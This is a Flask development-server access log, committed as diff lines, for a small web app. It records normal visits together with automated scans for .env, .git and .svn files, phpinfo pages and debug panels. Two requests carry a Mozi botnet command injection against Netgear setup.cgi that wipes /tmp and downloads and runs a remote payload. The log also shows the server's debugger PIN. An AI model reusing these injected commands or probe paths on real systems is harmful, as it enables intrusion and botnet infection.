+61.82.217.159 - - [07/Dec/2022 22:02:30] "GET /static/assets/search.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:02:30] "GET /static/assets/like.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:02:30] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+61.82.217.159 - - [07/Dec/2022 22:02:38] "GET /Mypage/Write2 HTTP/1.1" 404 -
+135.125.246.110 - - [07/Dec/2022 22:02:39] "POST / HTTP/1.1" 405 -
+135.125.246.110 - - [07/Dec/2022 22:02:39] "GET /.env HTTP/1.1" 404 -
+61.82.217.159 - - [07/Dec/2022 22:02:45] "GET /Mypage/Write/2 HTTP/1.1" 404 -
+112.152.36.226 - - [07/Dec/2022 22:32:03] "GET /favicon.ico HTTP/1.1" 404 -
+185.254.196.115 - - [07/Dec/2022 22:42:55] "GET /.env HTTP/1.1" 404 -
+185.254.196.115 - - [07/Dec/2022 22:42:55] "POST / HTTP/1.1" 405 -
+20.127.112.22 - - [07/Dec/2022 22:54:16] "GET /.git/config HTTP/1.1" 404 -
+135.125.246.110 - - [07/Dec/2022 22:56:01] "POST / HTTP/1.1" 405 -
+135.125.246.110 - - [07/Dec/2022 22:56:01] "GET /.env HTTP/1.1" 404 -
+121.53.181.250 - - [07/Dec/2022 23:00:30] "GET / HTTP/1.1" 200 -
+188.213.26.125 - - [07/Dec/2022 23:18:03] "GET /.svn/wc.db HTTP/1.1" 404 -
+193.118.53.210 - - [07/Dec/2022 23:46:25] "GET / HTTP/1.1" 200 -
+34.94.224.84 - - [07/Dec/2022 23:59:34] code 400, message Bad request version ('os')
+34.94.224.84 - - [07/Dec/2022 23:59:34] " M  IÁ< wz'kâ%ì÷ \.à°¹fÜEÔÓP@ os" HTTPStatus.BAD_REQUEST -
+34.94.224.84 - - [07/Dec/2022 23:59:38] "OPTIONS / HTTP/1.0" 200 -
+45.79.181.251 - - [08/Dec/2022 00:14:42] code 400, message Bad request version ('À\x14À')
+45.79.181.251 - - [08/Dec/2022 00:14:42] "   ÞÙ®¿¦0{øF	¦[C¾/¹ÜÑ³bÓ³äáû   À/À0À+À,Ì¨Ì©ÀÀ	ÀÀ" HTTPStatus.BAD_REQUEST -
+58.22.81.193 - - [08/Dec/2022 00:24:22] "GET / HTTP/1.0" 200 -
+ * Detected change in '/home/ubuntu/dailylog/Login/app.py', reloading
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 210-353-672
+135.125.246.110 - - [08/Dec/2022 01:13:11] "POST / HTTP/1.1" 405 -
+135.125.246.110 - - [08/Dec/2022 01:13:12] "GET /.env HTTP/1.1" 404 -
+183.96.80.196 - - [08/Dec/2022 01:14:42] "GET / HTTP/1.1" 200 -
+183.96.80.196 - - [08/Dec/2022 01:14:42] "GET /static/css/reset.css HTTP/1.1" 200 -
+183.96.80.196 - - [08/Dec/2022 01:14:42] "GET /static/css/style.css HTTP/1.1" 200 -
+183.96.80.196 - - [08/Dec/2022 01:14:42] "GET /static/js/index.js HTTP/1.1" 200 -
+183.96.80.196 - - [08/Dec/2022 01:14:42] "GET /static/assets/story_img1.png HTTP/1.1" 200 -
+183.96.80.196 - - [08/Dec/2022 01:14:42] "GET /static/assets/search.png HTTP/1.1" 200 -
+183.96.80.196 - - [08/Dec/2022 01:14:42] "GET /static/assets/mypage.png HTTP/1.1" 200 -
+183.96.80.196 - - [08/Dec/2022 01:14:42] "GET /static/assets/like.png HTTP/1.1" 200 -
+183.96.80.196 - - [08/Dec/2022 01:14:42] "GET /static/assets/menu/american/steak.png HTTP/1.1" 200 -
+183.96.80.196 - - [08/Dec/2022 01:14:42] "GET /static/assets/call.png HTTP/1.1" 200 -
+183.96.80.196 - - [08/Dec/2022 01:14:43] "GET /static/assets/house.svg HTTP/1.1" 200 -
+183.96.80.196 - - [08/Dec/2022 01:14:43] "GET /static/assets/house.svg HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 01:14:44] "GET /Good_Say HTTP/1.1" 200 -
+183.96.80.196 - - [08/Dec/2022 01:14:44] "GET / HTTP/1.1" 200 -
+183.96.80.196 - - [08/Dec/2022 01:14:44] "GET /static/css/reset.css HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 01:14:44] "GET /static/css/style.css HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 01:14:44] "GET /static/js/index.js HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 01:14:44] "GET /static/assets/like.png HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 01:14:44] "GET /static/assets/search.png HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 01:14:44] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 01:14:44] "GET /static/assets/story_img1.png HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 01:14:44] "GET /static/assets/menu/american/steak.png HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 01:14:44] "GET /static/assets/call.png HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 01:14:44] "GET /static/assets/house.svg HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 01:14:44] "GET /static/assets/house.svg HTTP/1.1" 304 -
+183.96.80.196 - - [08/Dec/2022 01:14:44] "GET /Good_Say HTTP/1.1" 200 -
+112.152.36.226 - - [08/Dec/2022 01:18:55] "GET / HTTP/1.1" 200 -
+112.152.36.226 - - [08/Dec/2022 01:18:55] "GET /static/css/reset.css HTTP/1.1" 200 -
+112.152.36.226 - - [08/Dec/2022 01:18:55] "GET /static/css/style.css HTTP/1.1" 200 -
+112.152.36.226 - - [08/Dec/2022 01:18:56] "GET /static/js/index.js HTTP/1.1" 200 -
+112.152.36.226 - - [08/Dec/2022 01:18:56] "GET /static/assets/search.png HTTP/1.1" 200 -
+112.152.36.226 - - [08/Dec/2022 01:18:56] "GET /static/assets/like.png HTTP/1.1" 200 -
+112.152.36.226 - - [08/Dec/2022 01:18:56] "GET /static/assets/mypage.png HTTP/1.1" 200 -
+112.152.36.226 - - [08/Dec/2022 01:18:56] "GET /static/assets/story_img1.png HTTP/1.1" 200 -
+112.152.36.226 - - [08/Dec/2022 01:18:56] "GET /static/assets/menu/american/steak.png HTTP/1.1" 200 -
+112.152.36.226 - - [08/Dec/2022 01:18:56] "GET /static/assets/call.png HTTP/1.1" 200 -
+112.152.36.226 - - [08/Dec/2022 01:18:57] "GET /static/assets/house.svg HTTP/1.1" 200 -
+112.152.36.226 - - [08/Dec/2022 01:18:57] "GET /static/assets/house.svg HTTP/1.1" 304 -
+112.152.36.226 - - [08/Dec/2022 01:18:57] "GET /Good_Say HTTP/1.1" 200 -
+112.152.36.226 - - [08/Dec/2022 01:20:42] "GET / HTTP/1.1" 200 -
+112.152.36.226 - - [08/Dec/2022 01:20:43] "GET /static/css/reset.css HTTP/1.1" 304 -
+112.152.36.226 - - [08/Dec/2022 01:20:43] "GET /static/css/style.css HTTP/1.1" 200 -
+112.152.36.226 - - [08/Dec/2022 01:20:43] "GET /static/js/index.js HTTP/1.1" 200 -
+112.152.36.226 - - [08/Dec/2022 01:20:43] "GET /static/assets/story_img1.png HTTP/1.1" 304 -
+112.152.36.226 - - [08/Dec/2022 01:20:43] "GET /static/assets/search.png HTTP/1.1" 200 -
+112.152.36.226 - - [08/Dec/2022 01:20:43] "GET /static/assets/mypage.png HTTP/1.1" 200 -
+112.152.36.226 - - [08/Dec/2022 01:20:43] "GET /static/assets/like.png HTTP/1.1" 200 -
+112.152.36.226 - - [08/Dec/2022 01:20:43] "GET /static/assets/menu/american/steak.png HTTP/1.1" 304 -
+112.152.36.226 - - [08/Dec/2022 01:20:43] "GET /static/assets/call.png HTTP/1.1" 304 -
+112.152.36.226 - - [08/Dec/2022 01:20:43] "GET /Good_Say HTTP/1.1" 200 -
+45.79.181.104 - - [08/Dec/2022 01:46:25] code 400, message Bad request version ('À\x14À')
+45.79.181.104 - - [08/Dec/2022 01:46:25] "   ¿ú­n$¼ "è=ìÀÎFòRÄÛCw'÷ÀÜc   À/À0À+À,Ì¨Ì©ÀÀ	ÀÀ" HTTPStatus.BAD_REQUEST -
+185.254.196.115 - - [08/Dec/2022 02:37:17] "GET /.env HTTP/1.1" 404 -
+185.254.196.115 - - [08/Dec/2022 02:37:18] "POST / HTTP/1.1" 405 -
+135.125.246.110 - - [08/Dec/2022 02:48:59] "POST / HTTP/1.1" 405 -
+135.125.246.110 - - [08/Dec/2022 02:48:59] "GET /.env HTTP/1.1" 404 -
+198.235.24.173 - - [08/Dec/2022 02:50:16] "GET / HTTP/1.0" 200 -
+115.59.211.151 - - [08/Dec/2022 03:00:10] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://115.59.211.151:56330/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 -
+135.125.246.110 - - [08/Dec/2022 03:47:46] "POST / HTTP/1.1" 405 -
+135.125.246.110 - - [08/Dec/2022 03:47:47] "GET /.env HTTP/1.1" 404 -
+185.254.196.115 - - [08/Dec/2022 04:23:07] "GET /.env HTTP/1.1" 404 -
+185.254.196.115 - - [08/Dec/2022 04:23:08] "POST / HTTP/1.1" 405 -
+20.21.122.159 - - [08/Dec/2022 05:20:14] "GET /.env HTTP/1.1" 404 -
+20.21.122.159 - - [08/Dec/2022 05:20:15] "POST / HTTP/1.1" 405 -
+45.83.64.100 - - [08/Dec/2022 05:23:06] "POST / HTTP/1.1" 405 -
+45.79.181.223 - - [08/Dec/2022 05:46:58] code 400, message Bad request version ('À\x14À')
+45.79.181.223 - - [08/Dec/2022 05:46:58] "   g¾u!ã=ú»IV.ø6ÎfNÈv51öâÊ¼i#úÂë   À/À0À+À,Ì¨Ì©ÀÀ	ÀÀ" HTTPStatus.BAD_REQUEST -
+135.125.246.110 - - [08/Dec/2022 05:55:54] "POST / HTTP/1.1" 405 -
+135.125.246.110 - - [08/Dec/2022 05:55:54] "GET /.env HTTP/1.1" 404 -
+95.214.235.205 - - [08/Dec/2022 06:05:24] "GET /.env HTTP/1.1" 404 -
+95.214.235.205 - - [08/Dec/2022 06:05:25] "POST / HTTP/1.1" 405 -
+112.152.36.226 - - [08/Dec/2022 06:22:48] "GET / HTTP/1.1" 200 -
+112.152.36.226 - - [08/Dec/2022 06:22:48] "GET /static/css/reset.css HTTP/1.1" 200 -
+112.152.36.226 - - [08/Dec/2022 06:22:48] "GET /static/css/style.css HTTP/1.1" 200 -
+112.152.36.226 - - [08/Dec/2022 06:22:49] "GET /static/js/index.js HTTP/1.1" 200 -
+112.152.36.226 - - [08/Dec/2022 06:22:49] "GET /static/assets/mypage.png HTTP/1.1" 200 -
+112.152.36.226 - - [08/Dec/2022 06:22:49] "GET /static/assets/story_img1.png HTTP/1.1" 200 -
+112.152.36.226 - - [08/Dec/2022 06:22:49] "GET /static/assets/search.png HTTP/1.1" 200 -
+112.152.36.226 - - [08/Dec/2022 06:22:49] "GET /static/assets/like.png HTTP/1.1" 200 -
+112.152.36.226 - - [08/Dec/2022 06:22:49] "GET /static/assets/menu/american/steak.png HTTP/1.1" 200 -
+112.152.36.226 - - [08/Dec/2022 06:22:49] "GET /static/assets/call.png HTTP/1.1" 200 -
+112.152.36.226 - - [08/Dec/2022 06:22:49] "GET /static/assets/house.svg HTTP/1.1" 200 -
+112.152.36.226 - - [08/Dec/2022 06:22:49] "GET /static/assets/house.svg HTTP/1.1" 304 -
+112.152.36.226 - - [08/Dec/2022 06:22:50] "GET /Good_Say HTTP/1.1" 200 -
+112.152.36.226 - - [08/Dec/2022 06:29:05] "GET / HTTP/1.1" 200 -
+112.152.36.226 - - [08/Dec/2022 06:29:05] "GET /static/css/reset.css HTTP/1.1" 304 -
+112.152.36.226 - - [08/Dec/2022 06:29:05] "GET /static/css/style.css HTTP/1.1" 304 -
+112.152.36.226 - - [08/Dec/2022 06:29:05] "GET /static/js/index.js HTTP/1.1" 304 -
+112.152.36.226 - - [08/Dec/2022 06:29:05] "GET /static/assets/like.png HTTP/1.1" 304 -
+112.152.36.226 - - [08/Dec/2022 06:29:05] "GET /static/assets/search.png HTTP/1.1" 304 -
+112.152.36.226 - - [08/Dec/2022 06:29:05] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+112.152.36.226 - - [08/Dec/2022 06:29:05] "GET /static/assets/story_img1.png HTTP/1.1" 304 -
+112.152.36.226 - - [08/Dec/2022 06:29:05] "GET /static/assets/menu/american/steak.png HTTP/1.1" 304 -
+112.152.36.226 - - [08/Dec/2022 06:29:05] "GET /static/assets/call.png HTTP/1.1" 304 -
+112.152.36.226 - - [08/Dec/2022 06:29:06] "GET /Good_Say HTTP/1.1" 200 -
+192.241.213.28 - - [08/Dec/2022 07:07:04] "GET /druid/index.html HTTP/1.1" 404 -
+185.254.196.115 - - [08/Dec/2022 07:37:41] "GET /.env HTTP/1.1" 404 -
+185.254.196.115 - - [08/Dec/2022 07:37:43] "POST / HTTP/1.1" 405 -
+112.94.96.149 - - [08/Dec/2022 07:54:27] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 -
+172.173.230.69 - - [08/Dec/2022 08:03:11] "GET /.hg/ HTTP/1.1" 404 -
+135.125.246.110 - - [08/Dec/2022 08:08:23] "POST / HTTP/1.1" 405 -
+135.125.246.110 - - [08/Dec/2022 08:08:24] "GET /.env HTTP/1.1" 404 -
+108.59.76.45 - - [08/Dec/2022 08:12:16] "GET / HTTP/1.1" 200 -
+135.125.246.110 - - [08/Dec/2022 08:35:44] "POST / HTTP/1.1" 405 -
+135.125.246.110 - - [08/Dec/2022 08:35:45] "GET /.env HTTP/1.1" 404 -
+165.232.40.21 - - [08/Dec/2022 09:45:35] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03:MagZV\x10Vá\x9a\x05É/$à©ÊÂIt²4Ç5£Ý\x00Æ&\x12é¾\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+165.232.40.21 - - [08/Dec/2022 09:45:35] " {  w:MagZVVáÉ/$à©ÊÂIt²4Ç5£Ý Æ&é¾  À/À+ÀÀÀÀ	ÀÀ" HTTPStatus.BAD_REQUEST -
+165.232.40.21 - - [08/Dec/2022 09:45:36] code 400, message Bad request version ('À\x14À')
+165.232.40.21 - - [08/Dec/2022 09:45:36] " {  w²ê¼=fB¼R_ÇÔâ÷mÉÎºñ¿×E  À/À+ÀÀÀÀ	ÀÀ" HTTPStatus.BAD_REQUEST -
+165.232.40.21 - - [08/Dec/2022 09:45:36] "GET / HTTP/1.1" 200 -
+205.210.31.24 - - [08/Dec/2022 09:49:39] code 400, message Bad HTTP/0.9 request type ("\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03\x89\x8dóñ\x1bÍ¢ÊÐKD(\x8a»\x13£C\x8fç\x9cÔæ1óÔÔ¦ÎÝ&u¡\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À")
+205.210.31.24 - - [08/Dec/2022 09:49:39] " Ê  ÆóñÍ¢ÊÐKD(»£CçÔæ1óÔÔ¦ÎÝ&u¡  hÌÌÀ/À+À0À,ÀÀÀ'À#ÀÀ	À(À$ÀÀ" HTTPStatus.BAD_REQUEST -
+185.254.196.115 - - [08/Dec/2022 10:04:01] "GET /.env HTTP/1.1" 404 -
+185.254.196.115 - - [08/Dec/2022 10:04:02] "POST / HTTP/1.1" 405 -
+84.21.172.205 - - [08/Dec/2022 10:13:36] "POST /boaform/admin/formLogin HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:16] "GET /_profiler/phpinfo HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:17] "POST / HTTP/1.1" 405 -
+85.209.135.110 - - [08/Dec/2022 10:20:17] "POST /debug/default/view?panel=config HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:18] "POST /tool/view/phpinfo.view.php HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:18] "POST /wp-config.php-backup HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:19] "POST /%C0 HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:19] "POST /debug/default/view.html HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:20] "POST /debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:21] "POST /frontend/web/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:21] "POST /web/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:22] "POST /sapi/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:22] "POST /debug/default/view?panel=config HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:23] "GET /tool/view/phpinfo.view.php HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:23] "POST / HTTP/1.1" 405 -
+85.209.135.110 - - [08/Dec/2022 10:20:23] "POST /debug/default/view?panel=config HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:24] "POST /tool/view/phpinfo.view.php HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:24] "POST /wp-config.php-backup HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:25] "POST /%C0 HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:25] "POST /debug/default/view.html HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:26] "POST /debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:26] "POST /frontend/web/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:27] "POST /web/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:27] "POST /sapi/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:28] "POST /debug/default/view?panel=config HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:28] "GET /wp-config.php-backup HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:29] "POST / HTTP/1.1" 405 -
+85.209.135.110 - - [08/Dec/2022 10:20:29] "POST /debug/default/view?panel=config HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:30] "POST /tool/view/phpinfo.view.php HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:30] "POST /wp-config.php-backup HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:31] "POST /%C0 HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:31] "POST /debug/default/view.html HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:32] "POST /debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:32] "POST /frontend/web/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:33] "POST /web/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:33] "POST /sapi/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:34] "POST /debug/default/view?panel=config HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:34] "GET /%C0 HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:35] "POST / HTTP/1.1" 405 -
+85.209.135.110 - - [08/Dec/2022 10:20:35] "POST /debug/default/view?panel=config HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:36] "POST /tool/view/phpinfo.view.php HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:36] "POST /wp-config.php-backup HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:37] "POST /%C0 HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:37] "POST /debug/default/view.html HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:38] "POST /debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:38] "POST /frontend/web/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:39] "POST /web/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:39] "POST /sapi/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:40] "POST /debug/default/view?panel=config HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:40] "GET /debug/default/view.html HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:41] "POST / HTTP/1.1" 405 -
+85.209.135.110 - - [08/Dec/2022 10:20:41] "POST /debug/default/view?panel=config HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:42] "POST /tool/view/phpinfo.view.php HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:42] "POST /wp-config.php-backup HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:43] "POST /%C0 HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:43] "POST /debug/default/view.html HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:44] "POST /debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:44] "POST /frontend/web/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:45] "POST /web/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:45] "POST /sapi/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:46] "POST /debug/default/view?panel=config HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:46] "GET /debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:47] "POST / HTTP/1.1" 405 -
+85.209.135.110 - - [08/Dec/2022 10:20:47] "POST /debug/default/view?panel=config HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:48] "POST /tool/view/phpinfo.view.php HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:48] "POST /wp-config.php-backup HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:49] "POST /%C0 HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:49] "POST /debug/default/view.html HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:50] "POST /debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:50] "POST /frontend/web/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:51] "POST /web/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:51] "POST /sapi/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:52] "POST /debug/default/view?panel=config HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:52] "GET /frontend/web/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:53] "POST / HTTP/1.1" 405 -
+85.209.135.110 - - [08/Dec/2022 10:20:53] "POST /debug/default/view?panel=config HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:54] "POST /tool/view/phpinfo.view.php HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:55] "POST /wp-config.php-backup HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:55] "POST /%C0 HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:56] "POST /debug/default/view.html HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:56] "POST /debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:57] "POST /frontend/web/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:57] "POST /web/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:58] "POST /sapi/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:58] "POST /debug/default/view?panel=config HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:59] "GET /web/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:20:59] "POST / HTTP/1.1" 405 -
+85.209.135.110 - - [08/Dec/2022 10:21:00] "POST /debug/default/view?panel=config HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:00] "POST /tool/view/phpinfo.view.php HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:01] "POST /wp-config.php-backup HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:01] "POST /%C0 HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:02] "POST /debug/default/view.html HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:02] "POST /debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:03] "POST /frontend/web/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:03] "POST /web/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:04] "POST /sapi/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:04] "POST /debug/default/view?panel=config HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:05] "GET /sapi/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:05] "POST / HTTP/1.1" 405 -
+85.209.135.110 - - [08/Dec/2022 10:21:06] "POST /debug/default/view?panel=config HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:06] "POST /tool/view/phpinfo.view.php HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:07] "POST /wp-config.php-backup HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:07] "POST /%C0 HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:07] "POST /debug/default/view.html HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:08] "POST /debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:09] "POST /frontend/web/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:09] "POST /web/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:09] "POST /sapi/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:10] "POST /debug/default/view?panel=config HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:10] "GET /debug/default/view?panel=config HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:11] "POST / HTTP/1.1" 405 -
+85.209.135.110 - - [08/Dec/2022 10:21:11] "POST /debug/default/view?panel=config HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:12] "POST /tool/view/phpinfo.view.php HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:12] "POST /wp-config.php-backup HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:13] "POST /%C0 HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:13] "POST /debug/default/view.html HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:14] "POST /debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:14] "POST /frontend/web/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:15] "POST /web/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:15] "POST /sapi/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:16] "POST /debug/default/view?panel=config HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:16] "GET /phpinfo.php HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:17] "POST / HTTP/1.1" 405 -
+85.209.135.110 - - [08/Dec/2022 10:21:17] "POST /debug/default/view?panel=config HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:18] "POST /tool/view/phpinfo.view.php HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:18] "POST /wp-config.php-backup HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:19] "POST /%C0 HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:19] "POST /debug/default/view.html HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:20] "POST /debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:20] "POST /frontend/web/debug/default/view HTTP/1.1" 404 -
+85.209.135.110 - - [08/Dec/2022 10:21:21] "POST /web/debug/default/view HTTP/1.1" 404 -
